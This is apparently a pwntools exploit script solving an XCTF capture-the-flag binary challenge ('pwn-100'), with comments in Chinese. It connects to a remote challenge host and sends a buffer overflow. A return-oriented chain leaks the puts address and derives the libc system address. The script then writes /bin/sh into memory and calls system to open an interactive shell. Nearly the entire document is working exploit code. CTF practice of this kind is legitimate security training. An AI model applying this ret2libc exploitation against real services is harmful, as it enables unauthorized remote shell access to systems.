# zzPwn Header Start
from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

io = remote('111.200.241.244',63547)
elf_path = './xctf_pwn_102_pwn_100'
#io = process(elf_path)
elf = ELF(elf_path)
# zzPwn Header End

# 0x0000000000400763 : pop rdi ; ret
pop_rdi_gadget = 0x400763
# 0x00000000004004e1 : ret
do_nothing_gadget = 0x4004e1

common_gadget_1 = 0x40075A
common_gadget_2 = 0x400740

binsh_addr = 0x601040
start_addr = 0x400550

# Run 1: 输出read函数的实际地址，借此确定Libc基址以及system地址
payload = payloadBase(0x40, 64)
payload += p64(pop_rdi_gadget)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(start_addr)
payload = payload.ljust(200, b"B")

io.send(payload)
io.recvuntil("bye~\n")
puts_addr = u64(io.recv(0xc)[:-1].ljust(8,b'\x00'))
log.info("puts_addr: %x", puts_addr)
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
log.info("system_addr: %x", system_addr)

# Run 2: 将/bin/sh写入.data内存段
payload  = payloadBase(0x40, 64)
payload += payloadContent_Common_Gadget\
    (start_addr, elf.got['read'], 0x0, binsh_addr, 0x8)
# 注意：至上一条指令，该溢出段长度正好为200
# 故在新的一次执行中调用System
payload = payload.ljust(200, b"B")

io.send(payload)
io.sendafter("bye~\n", "/bin/sh\x00")

# Run 3: 调用system
payload = payloadBase(0x40, 64)
payload += p64(do_nothing_gadget)
payload += p64(pop_rdi_gadget)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload = payload.ljust(200, b"B")

io.send(payload)
io.interactive() 